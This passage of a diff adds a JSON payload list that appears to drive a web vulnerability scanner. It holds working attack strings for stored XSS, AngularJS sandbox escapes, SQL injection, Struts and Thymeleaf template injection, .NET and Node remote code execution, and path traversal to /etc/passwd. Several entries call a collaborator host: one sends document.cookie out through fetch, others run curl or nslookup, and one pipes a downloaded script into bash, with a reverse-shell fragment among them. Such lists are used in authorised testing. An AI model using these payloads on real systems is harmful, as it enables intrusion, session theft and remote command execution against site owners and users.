+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*`/*'/*\\\"/*--></title></textarea></noscript></noembed></template></style></script><<script> /**/alert([increment]1[/increment])//<</script><frame onload=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*\\\"/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame src=javascript:/**/alert([increment]1[/increment])//><</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:\"/*'/*\\\"/*` /**/alert([increment]1[/increment])//--></title></textarea></style></noscript></noembed></template></script><script>alert([increment]1[/increment])</script><svg/<frame/onload=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*`/*'/*\\\"/*-->*/ alert([increment]1[/increment])//</title></textarea></style></noscript></noembed></template></script></select><frame/onload=alert``><<svg/onload=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/\"/'/*--><frame onload=alert([increment]1[/increment])><svg/\\\"/*<svg onload=' /**/-alert([increment]1[/increment])//'>javascript:/*`/*\\\"/*'/*</noembed>\"/*<frame src=javascript:/**/;alert([increment]1[/increment])//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert([increment]1[/increment])//>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])//\"/*`/*'/*\\\"/*--></title></textarea></noscript></noembed></template></style></script>*/ alert([increment]1[/increment])//<frame onload=alert([increment]1[/increment])><<script>alert([increment]1[/increment])<</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])//'//\"//\\\"//-->`//*/ alert([increment]1[/increment]);//</title></textarea></style></noscript></noembed></template><frame onload=alert([increment]1[/increment])></select></script><<svg onload=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*\\\"/*`/*'/**/ (alert([increment]1[/increment]))//</title></textarea></style></noscript></script></noembed></template></select><frame src=javascript:alert([increment]1[/increment])--><<svg/onload=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*\"/*'/*\\\"/*`/*><frame src=javascript:alert([increment]1[/increment])></template </textarea </title </style </noscript </noembed </script --><<script>alert([increment]1[/increment])<</script>\\ /**/alert([increment]1[/increment])//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*`/*'/*'/*\"-/*\\\"/**/ alert([increment]1[/increment])//></title></textarea></style></select></script></noembed></noscript></template>--><<svg/onload=alert([increment]1[/increment])><frame/src=javascript:alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:'/*`/*'/*\"/*\\\"/*<FRAME SRC= javascript:/**/-alert([increment]1[/increment])//--></title></textarea></style></noscript></noembed></template></script><script>//<svg onload= alert([increment]1[/increment])//</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert([increment]1[/increment])></script>*///\\\"//`//'//\"//><svg <svg onload=alert([increment]1[/increment])> alert([increment]1[/increment])//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])//'//\"//\\\"; '/`/*\\/*'/*\"/**/(alert([increment]1[/increment]))//</style></template/</title/</textarea/</noscript/</noembed/</script>--><frame <svg onload=alert([increment]1[/increment])><script>alert([increment]1[/increment])</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:alert([increment]1[/increment])//\\\";alert([increment]1[/increment]);<!--jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert([increment]1[/increment]) )//%0D%0A%0d%0a//--><FRAME SRC=\"javascript:alert([increment]1[/increment]);\"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert([increment]1[/increment])></title><script>alert([increment]1[/increment])</script><img src=0 onerror=alert([increment]1[/increment])><img src=x:x onerror=alert([increment]1[/increment])> alert([increment]1[/increment])//",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/\"/+/onclick=1/+/[*/[]/+alert([increment]1[/increment])//'>\"><svg/onload=`+/\"/+/onclick=/+/[*/[]/+alert([increment]1[/increment])//'>\"><script>alert([increment]1[/increment])</script><frame src=\"javascript:alert([increment]1[/increment])\"></frameset>+\\\"; alert([increment]1[/increment])//<img src onerror=alert([increment]1[/increment])>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": 10,
+        "payload": "\"0\"XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR\"Z\"",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "raptilfakeword",
+        "expectedDelay": 0,
+        "payload": "-1 UNION SELECT 'rap' || 'til' || 'fakeword'",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": 10,
+        "payload": "'0'XOR(if(now()=sysdate()%2Csleep(10)%2C0))XOR'Z'",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": 10,
+        "payload": "\"0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z\"",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "expectedDelay": 10,
+        "payload": "'0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectingTimeDelay": null,
+        "payload": "<img src=`x` onerror=`var ws=new ActiveXObject('WScript.Shell'); ws.Exec('mshta http://[COLLAB]')`>",
+        "expectingCollab": true,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": 10,
+        "payload": "0'||(SELECT CASE WHEN (ascii(substring((SELECT version()),1,1)) = 80) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'z",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0'||(SELECT CASE WHEN (ascii(substring((SELECT version()),1,1)) = 77) THEN sleep(10) ELSE sleep(0) END)||'z",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0'||(SELECT CASE WHEN (ascii(substr((SELECT version()),1,1)) = 79) THEN dbms_lock.sleep(10) ELSE null END)||'z",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0'; IF (ascii(substring((SELECT @@version), 1, 1)) = 77) WAITFOR DELAY '00:00:10' -- -",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0\"||(SELECT CASE WHEN (ascii(substring((SELECT version()),1,1)) = 80) THEN pg_sleep(10) ELSE pg_sleep(0) END)||\"z",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0\"||(SELECT CASE WHEN (ascii(substring((SELECT version()),1,1)) = 77) THEN sleep(10) ELSE sleep(0) END)||\"z",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0\"||(SELECT CASE WHEN (ascii(substr((SELECT version()),1,1)) = 79) THEN dbms_lock.sleep(10) ELSE null END)||\"z",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "0\"; IF (ascii(substring((SELECT @@version), 1, 1)) = 77) WAITFOR DELAY '00:00:10' --",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "<math><xss href=\"jAvAs%0d%0acRipT:prompt([increment]1[/increment])\">ClickMe</xss></math>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "\"><math><xss href=\"jAvAs%0d%0acRipT:prompt([increment]1[/increment])\">ClickMe</xss></math>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "<math><xss href=\"jAvAscRipT:prompt([increment]1[/increment])\">ClickMe</xss></math>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{constructor.constructor('alert([increment]1[/increment])')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{[].pop.constructor&#40'alert\\u00281\\u0029'&#41&#40&#41}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{0[a='constructor'][a]('alert([increment]1[/increment])')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{$eval.constructor('alert([increment]1[/increment])')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(\"astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert([increment]1[/increment])))+';astNode.argument={type:'Identifier',name:'foo'};\");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert([increment]1[/increment])');}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert([increment]1[/increment])//');}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert([increment]1[/increment])');}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert([increment]1[/increment])//');}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert([increment]1[/increment])//');  }}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert([increment]1[/increment])//');}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert([increment]1[/increment])')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert([increment]1[/increment])')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\\\u{6f}mpt(d\\\\u{6f}cument.d\\\\u{6f}main)')()}}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "'\"><svg/onload=fetch(`//[COLLAB]/${encodeURIComponent(document.cookie)}`)>",
+        "expectingCollab": true,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{\"<img onerror=confirm([increment]1[/increment]) src/>\":1}",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "%5Cu0027%252b%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p%5B0%5D%2C%7B%7D%29%252b%5Cu0027%26p%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%27X-RespText%27%2C%28new%2Bjava.io.PrintWriter%28new%2Bjava.io.FileWriter%28%27%2Ftmp%2Fa%27%2Cfalse%29%29%29.printf%28%27%27%2C%27%27%29.checkError%28%29%29",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "%5Cu0027%252b%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p%5B0%5D%2C%7B%7D%29%252b%5Cu0027%26p%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%27X-RespText%27%2C%28new%2Bjava.io.PrintWriter%28new%2Bjava.io.FileWriter%28%27%2Ftmp%2Fa%27%2Ctrue%29%29%29.printf%28%27%252Fbin%252Fbash%2B-i%2B%253E%2526%2B%252Fdev%252F%27%2C%27%27%29.checkError%28%29%29",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "%5Cu0027%252b%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p%5B0%5D%2C%7B%7D%29%252b%5Cu0027%26p%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%27X-RespText%27%2C%28new%2Bjava.io.PrintWriter%28new%2Bjava.io.FileWriter%28%27%2Ftmp%2Fa%27%2Ctrue%29%29%29.printf%28%27tcp%252F[COLLAB]%252F12169%27%2C%27%27%29.checkError%28%29%29",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "%5Cu0027%252b%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p%5B0%5D%2C%7B%7D%29%252b%5Cu0027%26p%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%27X-RespText%27%2C%28new%2Bjava.io.PrintWriter%28new%2Bjava.io.FileWriter%28%27%2Ftmp%2Fa%27%2Ctrue%29%29%29.printf%28%27%2B0%253E%25261%27%2C%27%27%29.checkError%28%29%29",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "%5Cu0027%252b%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29.internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.p%5B0%5D%2C%7B%7D%29%252b%5Cu0027%26p%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%27X-RespText%27%2C%28new%2Bfreemarker.template.utility.Execute%28%29%29.exec%28%7B%22bash+%2Ftmp%2Fa%22%7D%29%29",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'\" + 'curl [COLLAB]' + \"'}))",
+        "expectingCollab": true,
+        "category": "ALL"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "<span th:text=\"&ast;{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl http://[COLLAB]').getInputStream())} \"></span>",
+        "expectingCollab": true,
+        "category": "SSTI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "<<k>/script><<k>script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va21IKQ=='))<<k>/script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "(function(){var cp=require(\"child_process\");cp.execSync(\"nslookup [COLLAB]\");})();%00",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "[[constructor.constructor('alert([increment]1[/increment])')()]]",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": "root:",
+        "expectedDelay": null,
+        "payload": "aCSHELL/../../../../../../../etc/passwd",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "root:",
+        "expectedDelay": null,
+        "payload": "../../../../../../../etc/passwd%00.png",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": "alert(1)",
+        "expectedDelay": null,
+        "payload": "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": "alert(1)",
+        "expectedDelay": null,
+        "payload": "%22%3e%3c%0d%0aimg%20src%20onerror=alert([increment]1[/increment])%3e",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "A; curl http://[COLLAB]/test.sh | /bin/bash; 1",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "root:",
+        "expectedDelay": null,
+        "payload": "/****/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd",
+        "expectingCollab": false,
+        "category": "LFI"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": "10",
+        "payload": "/+java.lang.T<!--IgnoreMe!!!!-->hread.s[(: IGNORE :)]leep&#010;&#032;&#009;<![CDATA[ (10000) ]]>",
+        "expectingCollab": false,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "java.lang.String",
+        "expectedDelay": null,
+        "payload": "${('a').class}",
+        "expectingCollab": false,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "java.lang.String",
+        "expectedDelay": null,
+        "payload": "${'a'.class}",
+        "expectingCollab": false,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "<esi:include src=\"[COLLAB]\"/>",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "\"><!--esx--><script>alert([increment]1[/increment])</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "\\\"><!--esx--><script>alert([increment]1[/increment])</script>",
+        "expectingCollab": false,
+        "category": "XSS (STORED)"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "<esi:include src=\\\"[COLLAB]\\\"\\/>",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "(1/(37-Convert.ToInt32((new%5B%5D+%7B%20%22%22.GetType().Assembly.DefinedTypes.Skip(161).First().DeclaredMethods.Skip(69).First().Invoke(%22%22.GetType().Assembly.DefinedTypes.Skip(161).First().DeclaredProperties.First().GetValue(null),%20string.Join(%22%22,%20new%5B%5D%20%7B%20%22System,%20Version%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%20%22%204.0.0.0,%20Culture%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%22%20neutral,%20PublicKeyToken%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%22%20b77a5c561934e089;System.Diagnostics.Process%22%20%7D).Split(%22;%22.ToCharArray())).GetType().Assembly.DefinedTypes.Skip(37).First().DeclaredMethods.Skip(4).First().Invoke(null,%20string.Join(%22%22,%20new%5B%5D%20%7B%20%22/b%22,%20%22in%22,%20%22/%22,%20%22ba%22,%20%22sh%22,%20%22;-c%20%5C%22curl%20http://[COLLAB]%20%5C%22%22%7D).Split(%22;%22.ToCharArray())).GetType().FullName,%22b%22%7D).First()%5B0%5D)))",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "(1/(37-Convert.ToInt32((new%5B%5D+%7B%20%22%22.GetType().Assembly.DefinedTypes.Skip(161).First().DeclaredMethods.Skip(69).First().Invoke(%22%22.GetType().Assembly.DefinedTypes.Skip(161).First().DeclaredProperties.First().GetValue(null),%20string.Join(%22%22,%20new%5B%5D%20%7B%20%22System,%20Version%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%20%22%204.0.0.0,%20Culture%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%22%20neutral,%20PublicKeyToken%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%22%20b77a5c561934e089;System.Diagnostics.Process%22%20%7D).Split(%22;%22.ToCharArray())).GetType().Assembly.DefinedTypes.Skip(37).First().DeclaredMethods.Skip(4).First().Invoke(null,%20string.Join(%22%22,%20new%5B%5D%20%7B%20%22/b%22,%20%22in%22,%20%22/%22,%20%22ba%22,%20%22sh%22,%20%22;-c%20%5C%22nslo%22,%22okup%20[COLLAB]%20%5C%22%22%7D).Split(%22;%22.ToCharArray())).GetType().FullName,%22b%22%7D).First()%5B0%5D)))",
+        "expectingCollab": true,
+        "category": "ALL"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "(1/(37-Convert.ToInt32((new%5B%5D+%7B%20%22%22.GetType().Assembly.DefinedTypes.Skip(161).First().DeclaredMethods.Skip(69).First().Invoke(%22%22.GetType().Assembly.DefinedTypes.Skip(161).First().DeclaredProperties.First().GetValue(null),%20string.Join(%22%22,%20new%5B%5D%20%7B%20%22System,%20Version%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%20%22%204.0.0.0,%20Culture%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%22%20neutral,%20PublicKeyToken%20%22,%20%22%22.GetType().Assembly.ToString()%5B31%5D.ToString(),%22%20b77a5c561934e089;System.Diagnostics.Process%22%20%7D).Split(%22;%22.ToCharArray())).GetType().Assembly.DefinedTypes.Skip(37).First().DeclaredMethods.Skip(4).First().Invoke(null,%20string.Join(%22%22,%20new%5B%5D%20%7B%20%22/cm%22,%20%22d.ex%22,%20%22e%22,%20%22;/c%20%5C%22ping%20[COLLAB]%20%5C%22%22%7D).Split(%22;%22.ToCharArray())).GetType().FullName,%22b%22%7D).First()%5B0%5D)))",
+        "expectingCollab": true,
+        "category": "ALL"
+    },
+    {
+        "expectedResponse": null,
+        "expectedDelay": null,
+        "payload": "{{var this.getTemmplateFilter().addAfterFiterCallback(system).filter(ping [COLLAB])}}",
+        "expectingCollab": true,
+        "category": "RCE"
+    },
+    {
+        "expectedResponse": "PostgreSQL",
+        "expectedDelay": null,
+        "payload": "0 UNION SELECT VERSION()--+-",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "UNION SELECT * FROM v$version--+-",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "SELECT 1 FROM dual UNION SELECT * FROM v$version--+-",
+        "expectingCollab": false,
+        "category": "ALL"
+    },
+    {
+        "expectedResponse": "Microsoft SQL Server",
+        "expectedDelay": null,
+        "payload": "SELECT @@version--+-",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner,banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner,banner,banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner,banner,banner,banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner,banner,banner,banner,banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "Oracle Database",
+        "expectedDelay": null,
+        "payload": "'+UNION+SELECT+banner,banner,banner,banner,banner,banner,banner,banner+FROM+v$version--",
+        "expectingCollab": false,
+        "category": "SQLI"
+    },
+    {
+        "expectedResponse": "root:",
+        "expectedDelay": null,
